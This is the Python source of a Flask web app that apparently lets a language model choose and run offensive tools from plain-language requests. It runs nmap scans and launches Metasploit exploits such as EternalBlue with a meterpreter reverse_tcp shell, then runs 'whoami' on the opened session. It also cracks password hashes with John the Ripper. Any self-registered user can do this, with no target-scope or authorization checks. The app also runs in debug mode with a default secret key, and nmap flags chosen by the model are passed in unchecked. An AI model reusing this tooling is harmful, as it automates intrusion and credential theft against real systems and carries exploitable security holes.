from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
import subprocess
import json
import os
import re
import tempfile
import threading
from transformers import AutoModelForCausalLM, AutoTokenizer, BitsAndBytesConfig, TrainingArguments, pipeline
from peft import LoraConfig
from trl import SFTTrainer
from datasets import Dataset
import torch
from pymetasploit3.msfrpc import MsfRpcClient
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from werkzeug.security import generate_password_hash, check_password_hash

# --- Configuration ---
SECRET_KEY = os.environ.get('SECRET_KEY', 'please-change-me-in-production')
MSF_RPC_PASSWORD = os.environ.get('MSF_RPC_PASSWORD', 'your_password') # Change this or set ENV var
DATABASE_URI = 'sqlite:///db.sqlite'
MODEL_ID = "TheBloke/WhiteRabbitNeo-13B-v1-GPTQ" # Or your fine-tuned model path

# --- App Initialization ---
app = Flask(__name__)
app.config['SECRET_KEY'] = SECRET_KEY
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URI
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# --- Fine-Tuning Status ---
finetune_status = {
    "is_running": False,
    "progress": "Not started",
    "error": None
}

# --- Models ---
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password_hash = db.Column(db.String(128))

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

class Correction(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    prompt = db.Column(db.Text)
    corrected_output = db.Column(db.Text)

class ToolOutput(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    tool_name = db.Column(db.String(50))
    raw_input = db.Column(db.Text)
    raw_output = db.Column(db.Text)
    llm_analysis = db.Column(db.Text)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    user = db.relationship('User', backref=db.backref('tool_outputs', lazy=True))


@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# --- LLM and Prompts ---
PROMPT_TOOL_SELECTION = """
You are a master controller for a pentesting application. Analyze the user's request and determine which tool to use (nmap, metasploit, or john).
Provide the output in a clean JSON format.

**User Request:**
{user_prompt}

**JSON Output:**
```json
{{
    "tool": "The tool to use (nmap, metasploit, or john).",
    "parameters": {{
        "target": "The target IP address for nmap.",
        "scan_type": "The nmap scan type (e.g., '-sV -T4').",
        "exploit": "The Metasploit exploit (e.g., 'exploit/windows/smb/ms17_010_eternalblue').",
        "payload": "The Metasploit payload (e.g., 'windows/x64/meterpreter/reverse_tcp').",
        "rhost": "The RHOST for Metasploit.",
        "lhost": "The LHOST for Metasploit.",
        "lport": "The LPORT for Metasploit.",
        "hash": "The hash to crack with John the Ripper."
    }}
}}
```
"""

PROMPT_NMAP_ANALYSIS = """
Analyze the following nmap scan results and provide a structured summary of the findings in JSON format.
Highlight key vulnerabilities and suggest a potential Metasploit exploit if applicable.

**Nmap Scan Results:**
{nmap_output}

**JSON Output:**
```json
{{
    "summary": "A brief, easy-to-understand summary of the findings.",
    "metasploit_suggestion": {{
        "exploit": "The recommended Metasploit exploit (e.g., 'exploit/windows/smb/ms17_010_eternalblue'). Leave empty if none.",
        "payload": "The recommended payload (e.g., 'windows/x64/meterpreter/reverse_tcp'). Leave empty if none."
    }}
}}
```
"""

PROMPT_JOHN_ANALYSIS = """
Analyze the following output from John the Ripper, which shows cracked passwords.
Provide a brief analysis of the password strength and complexity.

**Cracked Passwords:**
{john_output}

**Analysis:**
"""

# Initialize the pipeline. For production, consider model loading strategies.
llm_pipeline = pipeline("text-generation", model=MODEL_ID, revision="gptq-4bit-32g-actorder_True")

def parse_llm_json(llm_output):
    """More robustly parses JSON from the LLM's output."""
    match = re.search(r"```json\s*(\{.*?\})\s*```", llm_output, re.DOTALL)
    if not match:
        return None
    try:
        return json.loads(match.group(1))
    except json.JSONDecodeError:
        return None

# --- Tool Functions ---
def nmap_scan(target, scan_type):
    """Runs an Nmap scan and returns the raw output."""
    if not target or not scan_type:
        return {"error": "Target and scan type are required for Nmap."}
    command = ['nmap', scan_type, target]
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True, timeout=300)
        return {"output": result.stdout}
    except subprocess.CalledProcessError as e:
        return {"error": f"Nmap scan failed: {e.stderr}"}
    except subprocess.TimeoutExpired:
        return {"error": "Nmap scan timed out after 5 minutes."}

def metasploit_exploit(exploit_name, payload_name, rhost, lhost, lport):
    """Executes a Metasploit exploit."""
    try:
        client = MsfRpcClient(MSF_RPC_PASSWORD, ssl=True)
        exploit = client.modules.use('exploit', exploit_name)
        exploit['RHOSTS'] = rhost
        exploit['LHOST'] = lhost
        exploit['LPORT'] = lport
        job = exploit.execute(payload=payload_name)
        for _ in range(20):
            import time
            time.sleep(1)
            if client.sessions.list:
                session_id = list(client.sessions.list.keys())[0]
                shell = client.sessions.session(session_id)
                shell.write('whoami\n')
                time.sleep(1)
                return {"output": shell.read()}
        return {"error": "Exploit executed, but no session was created."}
    except Exception as e:
        return {"error": f"Metasploit error: {str(e)}"}

def john_the_ripper(hash_string, john_format=None, wordlist=None):
    """Cracks a hash using John the Ripper."""
    if not wordlist:
        wordlist = '/usr/share/wordlists/rockyou.txt'
    try:
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix=".txt") as tmp_file:
            tmp_file.write(hash_string)
            tmp_filename = tmp_file.name
        command = ['john', f'--wordlist={wordlist}']
        if john_format:
            command.append(f'--format={john_format}')
        command.append(tmp_filename)
        subprocess.run(command, capture_output=True, text=True, check=True, timeout=300)
        show_command = ['john', '--show', tmp_filename]
        cracked_result = subprocess.run(show_command, capture_output=True, text=True, check=True)
        os.remove(tmp_filename)
        return {"output": cracked_result.stdout}
    except subprocess.CalledProcessError as e:
        return {"error": f"John the Ripper failed: {e.stderr}"}
    except FileNotFoundError:
        return {"error": "John the Ripper or the specified wordlist was not found."}
    except Exception as e:
        return {"error": str(e)}

# --- Fine-Tuning Function ---
def run_finetuning_task():
    global finetune_status
    try:
        with app.app_context():
            corrections = Correction.query.all()
            if not corrections:
                raise ValueError("No corrections available to fine-tune.")

            # 1. Prepare Dataset
            data = [{"text": f"<s>[INST] {c.prompt} [/INST] {c.corrected_output} </s>"} for c in corrections]
            dataset = Dataset.from_list(data)

            # 2. Load Model and Tokenizer with Quantization
            quantization_config = BitsAndBytesConfig(load_in_4bit=True, bnb_4bit_compute_dtype=torch.float16)
            tokenizer = AutoTokenizer.from_pretrained(MODEL_ID)
            model = AutoModelForCausalLM.from_pretrained(MODEL_ID, quantization_config=quantization_config, device_map="auto")
            
            tokenizer.pad_token = tokenizer.eos_token

            # 3. Configure PEFT (LoRA)
            lora_config = LoraConfig(
                r=8,
                target_modules=["q_proj", "o_proj", "k_proj", "v_proj", "gate_proj", "up_proj", "down_proj"],
                bias="none",
                task_type="CAUSAL_LM",
            )
            model.add_adapter(lora_config)

            # 4. Set up Trainer
            output_dir = "results"
            training_args = TrainingArguments(
                output_dir=output_dir,
                per_device_train_batch_size=4,
                gradient_accumulation_steps=4,
                learning_rate=2e-4,
                logging_steps=10,
                num_train_epochs=3,
                max_steps=-1, # Overridden by num_train_epochs
            )

            trainer = SFTTrainer(
                model=model,
                train_dataset=dataset,
                args=training_args,
                peft_config=lora_config,
                dataset_text_field="text",
                max_seq_length=1024,
            )

            # 5. Run Training
            finetune_status['progress'] = "Training started..."
            trainer.train()
            
            # 6. Save Model
            final_checkpoint = os.path.join(output_dir, "final-checkpoint")
            trainer.save_model(final_checkpoint)
            
            finetune_status['progress'] = f"Fine-tuning complete! Model saved to {final_checkpoint}"

    except Exception as e:
        finetune_status['error'] = str(e)
        finetune_status['progress'] = "Failed"
    finally:
        finetune_status['is_running'] = False


# --- Routes ---
@app.route('/')
@login_required
def index():
    return render_template('index.html')

@app.route('/prompt', methods=['POST'])
@login_required
def prompt():
    user_prompt = request.form.get('prompt')
    if not user_prompt:
        flash("Please enter a prompt.", "warning")
        return redirect(url_for('index'))

    llm_prompt = PROMPT_TOOL_SELECTION.format(user_prompt=user_prompt)
    llm_output_raw = llm_pipeline(llm_prompt, max_length=1024, num_return_sequences=1, temperature=0.1)[0]['generated_text']
    llm_data = parse_llm_json(llm_output_raw)

    if not llm_data:
        return render_template('error.html', error="Could not understand the request. The LLM returned an invalid format.")

    tool = llm_data.get('tool')
    params = llm_data.get('parameters', {})
    
    if tool == 'nmap':
        result = nmap_scan(params.get('target'), params.get('scan_type'))
        if 'error' in result:
            return render_template('error.html', error=result['error'])
        
        analysis_prompt = PROMPT_NMAP_ANALYSIS.format(nmap_output=result['output'])
        analysis_raw = llm_pipeline(analysis_prompt, max_length=1024, num_return_sequences=1, temperature=0.2)[0]['generated_text']
        analysis_data = parse_llm_json(analysis_raw) or {}
        
        summary = analysis_data.get('summary', "Could not generate summary.")
        metasploit_suggestion = analysis_data.get('metasploit_suggestion', {})

        new_output = ToolOutput(
            tool_name='nmap',
            raw_input=f"Target: {params.get('target')}, Scan: {params.get('scan_type')}",
            raw_output=result['output'],
            llm_analysis=summary,
            user_id=current_user.id
        )
        db.session.add(new_output)
        db.session.commit()
        return render_template('nmap_results.html', results=result['output'], summary=summary, metasploit_suggestion=metasploit_suggestion, target=params.get('target'), output_id=new_output.id)

    elif tool == 'john':
        result = john_the_ripper(params.get('hash'), params.get('format'), params.get('wordlist'))
        if 'error' in result:
            return render_template('error.html', error=result['error'])
        
        analysis_prompt = PROMPT_JOHN_ANALYSIS.format(john_output=result['output'])
        analysis = llm_pipeline(analysis_prompt, max_length=512, num_return_sequences=1, temperature=0.2)[0]['generated_text']

        new_output = ToolOutput(
            tool_name='john',
            raw_input=params.get('hash'),
            raw_output=result['output'],
            llm_analysis=analysis,
            user_id=current_user.id
        )
        db.session.add(new_output)
        db.session.commit()
        return render_template('john_results.html', cracked_passwords=result['output'], analysis=analysis, output_id=new_output.id)
    
    elif tool == 'metasploit':
        return redirect(url_for('metasploit_form', **params))
    else:
        return render_template('error.html', error=f"Unknown tool selected by LLM: {tool}")

@app.route('/metasploit', methods=['GET', 'POST'])
@login_required
def metasploit_form():
    if request.method == 'POST':
        result = metasploit_exploit(request.form.get('exploit'), request.form.get('payload'), request.form.get('rhost'), request.form.get('lhost'), request.form.get('lport'))
        if 'error' in result:
            return render_template('error.html', error=result['error'])
        return render_template('metasploit_results.html', output=result['output'])
    return render_template('metasploit_form.html', params=request.args)


# --- Auth Routes ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = User.query.filter_by(username=request.form['username']).first()
        if user and user.check_password(request.form['password']):
            login_user(user)
            return redirect(url_for('index'))
        else:
            flash('Invalid username or password.', 'danger')
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        if User.query.filter_by(username=request.form.get('username')).first():
            flash('Username already exists.', 'danger')
            return redirect(url_for('register'))
        new_user = User(username=request.form.get('username'))
        new_user.set_password(request.form.get('password'))
        db.session.add(new_user)
        db.session.commit()
        flash('Account created successfully. Please log in.', 'success')
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You have been logged out.', 'info')
    return redirect(url_for('login'))

# --- Correction/Finetuning Routes ---
@app.route('/correction/<int:output_id>', methods=['GET', 'POST'])
@login_required
def correction(output_id):
    tool_output = ToolOutput.query.get_or_404(output_id)
    if tool_output.user_id != current_user.id:
        flash("You can only correct your own tool outputs.", "danger")
        return redirect(url_for('index'))

    if request.method == 'POST':
        prompt_for_correction = tool_output.raw_output 
        corrected_text = request.form['corrected_output']
        
        new_correction = Correction(prompt=prompt_for_correction, corrected_output=corrected_text)
        db.session.add(new_correction)
        db.session.commit()
        
        flash('Correction submitted. Thank you for your feedback!', 'success')
        return redirect(url_for('index'))
    else: 
        return render_template('correction.html', prompt=tool_output.raw_output, output=tool_output.llm_analysis, output_id=output_id)

@app.route('/finetune', methods=['POST'])
@login_required
def finetune():
    global finetune_status
    if finetune_status['is_running']:
        flash("A fine-tuning process is already running.", "warning")
        return redirect(url_for('index'))

    finetune_status = {"is_running": True, "progress": "Initializing...", "error": None}
    
    thread = threading.Thread(target=run_finetuning_task)
    thread.daemon = True
    thread.start()

    flash("Fine-tuning process has been started in the background.", "success")
    return redirect(url_for('index'))

@app.route('/finetune_status')
@login_required
def finetune_status_route():
    return jsonify(finetune_status)

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(debug=True, port=5001)
